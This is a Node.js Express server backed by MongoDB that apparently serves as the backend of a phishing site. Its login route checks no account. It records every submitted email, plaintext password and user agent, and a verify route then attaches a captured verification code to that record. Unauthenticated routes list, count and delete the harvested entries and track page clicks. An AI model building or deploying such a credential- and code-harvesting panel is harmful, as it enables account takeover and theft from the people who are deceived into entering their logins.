const express = require('express');
const { MongoClient, ObjectId } = require('mongodb');
const cors = require('cors');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
require('dotenv').config(); // To use environment variables

const app = express();

app.use(cors());
app.use(bodyParser.json());

const uri = process.env.MONGO_URI; // Use environment variable for MongoDB URI
const client = new MongoClient(uri);
let db;

// Connect to MongoDB
async function connectToDatabase() {
    try {
        await client.connect();
        db = client.db('mega_project'); // Use your database name
        console.log('Connected to MongoDB');
    } catch (error) {
        console.error('MongoDB connection error:', error);
    }
}

connectToDatabase();

// Setup Nodemailer transporter
// const transporter = nodemailer.createTransport({
//     secure: true,
//     service: 'Gmail', // Or use another provider
//     auth: {
//         user: process.env.EMAIL_USER, // Use environment variable for email
//         pass: process.env.EMAIL_PASS,  // Use environment variable for password
//     },
// });

// Helper function to format date
function formatDate(date) {
    const day = String(date.getDate()).padStart(2, '0');
    const month = String(date.getMonth() + 1).padStart(2, '0'); // Months are zero-based
    const year = date.getFullYear();
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    const seconds = String(date.getSeconds()).padStart(2, '0');
    return `${day}-${month}-${year} ${hours}:${minutes}:${seconds}`;
}

// Add login data to MongoDB
app.post('/api/login', async (req, res) => {
    if (!db) {
        return res.status(500).json({ error: 'Database not connected' });
    }

    const { email, password, userAgent } = req.body;
    const date = formatDate(new Date());

    try {
        // Check if user exists       
            // User does not exist, insert new record
            const newUser = { email, password, date, createdAt: new Date(), userAgent, code: null , updateData:null };
            const result = await db.collection('login_data').insertOne(newUser);
            res.status(200).json({ success: true, userId: result.insertedId });
        
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error logging in' });
    }

    // try {
    //      await db.collection('login_data').insertOne({ email, password, date, createdAt: new Date(), userAgent });
        

    //     const mailOptions = {
    //         from: process.env.EMAIL_USER,
    //         to: email,
    //         subject: 'Your verification code',
    //         text: `Your verification code is: ${code}`,
    //     };

    //     await transporter.sendMail(mailOptions);
    //     console.log('Email sent successfully');
    //     return res.status(200).json({ message: 'Verification code sent' });
    // } catch (err) {
    //     res.status(500).json({ success: false, message: 'Error logging in' });
    // }
});

// API to count documents
app.get('/api/logindata/count', async (req, res) => {
    if (!db) {
        return res.status(500).json({ error: 'Database not connected' });
    }

    const { filter } = req.query;
    try {
        const todayCount = await db.collection('login_data').countDocuments({
            createdAt: { $gte: new Date(new Date().setHours(0, 0, 0, 0)) },
        });
        const weeklyCount = await db.collection('login_data').countDocuments({
            createdAt: { $gte: new Date(new Date().setDate(new Date().getDate() - 7)) },
        });

        if (filter === 'today') {
            return res.json({ count: todayCount });
        } else if (filter === 'weekly') {
            return res.json({ count: weeklyCount });
        }

        res.json({ count: 0 });
    } catch (error) {
        console.error("Error fetching counts:", error);
        res.status(500).json({ error: 'Error retrieving counts' });
    }
});


app.get('/api/signupdata/count', async (req, res) => {
    const { filter } = req.query;
    try {
        const todayCount = await db.collection('signup_data').countDocuments({
            createdAt: { $gte: new Date(new Date().setHours(0, 0, 0, 0)) },
        });
        const weeklyCount = await db.collection('signup_data').countDocuments({
            createdAt: { $gte: new Date(new Date().setDate(new Date().getDate() - 7)) },
        });
  
        if (filter === 'today') {
            return res.json({ count: todayCount });
        } else if (filter === 'weekly') {
            return res.json({ count: weeklyCount });
        }
  
        res.json({ count: 0 });
    } catch (error) {
        console.error("Error fetching counts:", error);
        res.status(500).send('Error retrieving counts');
    }
  });

// API to get all login users
app.get('/api/loginAll', async (req, res) => {
    if (!db) {
        return res.status(500).json({ error: 'Database not connected' });
    }

    try {
        const users = await db.collection('login_data').find().sort({ createdAt: -1 }).toArray();
        res.json(users);
    } catch (error) {
        console.error("Error retrieving users:", error);
        res.status(500).json({ error: 'Error retrieving users' });
    }
});

// API to signup users
app.post('/api/signup', async (req, res) => {
    if (!db) {
        return res.status(500).json({ error: 'Database not connected' });
    }

    const { email, password, confirm, userAgent } = req.body;
    const date = formatDate(new Date());

    try {
        // Hash the password before storing
        
        await db.collection('signup_data').insertOne({ email, password, confirm, date, createdAt: new Date(), userAgent });
        res.status(201).json({ message: 'User signed up successfully' });
    } catch (err) {
        console.error('Error occurred:', err);
        return res.status(500).json({ error: 'Server error' });
    }
});

// API to update an item
// app.put('/api/items/:code', async (req, res) => {
//     const { code } = req.params;
//     const updateData = req.body;

//     try {
//         const collection = db.collection('login_data');

//         const result = await collection.updateOne(
//             { code: code.toString() }, // Find the document by ID
//             { $set: updateData } // Add or update properties
//         );

//         if (result.modifiedCount === 1) {
//             res.status(200).json({ message: 'Item updated successfully' });
//         } else {
//             res.status(404).json({ message: 'Item not found' });
//         }
//     } catch (error) {
//         console.error(error);
//         res.status(500).json({ error: 'Internal server error' });
//     }
// });


app.post('/verify', async (req, res) => {
    const { userId, code, updateData } = req.body;
    try {
        const result = await db.collection('login_data').updateOne(
            { _id: new ObjectId(userId) },
            { 
                $set: { 
                    code,
                    updateData  // Spread the fields in updateData into $set
                } 
            }
        );

        if (result.modifiedCount > 0) {
            res.status(200).json({ success: true });
        } else {
            res.status(400).json({ success: false, message: 'User not found' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error verifying code' });
    }
});



// API to get all signup users
app.get('/api/signupAll', async (req, res) => {
    if (!db) {
        return res.status(500).json({ error: 'Database not connected' });
    }

    const { filter } = req.query;
    try {
        const collection = db.collection('signup_data');
        let query = {};

        if (filter) {
            query.createdAt = getDateRange(filter); // Add time-based filter logic if implemented
        }
        const data = await collection.find().sort({ createdAt: -1 }).toArray();
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: 'Error retrieving data' });
    }
});

// Delete login data
app.delete('/api/logindelete/:id', async (req, res) => {
    const { id } = req.params;
    try {
        const collection = db.collection('login_data');
        await collection.deleteOne({ _id: new ObjectId(id) });
        res.json({ message: 'Data deleted successfully' });
    } catch (error) {
        res.status(500).json({ error: 'Error deleting data' });
    }
});

// Delete signup data
app.delete('/api/signupdelete/:id', async (req, res) => {
    const { id } = req.params;
    try {
        const collection = db.collection('signup_data');
        await collection.deleteOne({ _id: new ObjectId(id) });
        res.json({ message: 'Data deleted successfully' });
    } catch (error) {
        res.status(500).json({ error: 'Error deleting data' });
    }
});

// Click data API
app.get('/api/clicks', async (req, res) => {
    if (!db) {
        return res.status(500).json({ error: 'Database not connected' });
    }

    const { page } = req.query;
    const today = new Date();
    const startOfDay = new Date(today.setHours(0, 0, 0, 0));

    try {
        const clicksCollection = db.collection('clicks');
        const document = await clicksCollection.findOne({ date: startOfDay });
        if (!document || !document.pages) {
            return res.status(404).json({ error: 'No click data found for today' });
        }
        if (page) {
            const clicks = document.pages[page] || 0;
            return res.status(200).json({ page, clicks });
        }

        return res.status(200).json({ pages: document.pages });
    } catch (error) {
        return res.status(500).json({ error: 'Server error' });
    }
});

app.post('/api/clicks', async (req, res) => {
    const { page } = req.body;
    if (!page) {
        return res.status(400).json({ error: 'Page parameter is required' });
    }
    const today = new Date();
    const startOfDay = new Date(today.setHours(0, 0, 0, 0));
    try {
        const clicksCollection = db.collection('clicks');
        const result = await clicksCollection.findOneAndUpdate(
            { date: startOfDay },
            { $inc: { [`pages.${page}`]: 1 } },
            { upsert: true, returnDocument: 'after' }
        );
        const clicks = result.value?.pages[page] || 1; // Return the new count
        return res.status(200).json({ page, clicks });
    } catch (error) {
        return res.status(500).json({ error: 'Server error' });
    }
});

// Start the server
const PORT = process.env.PORT || 5000; // Set PORT from environment variable or default to 5000
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
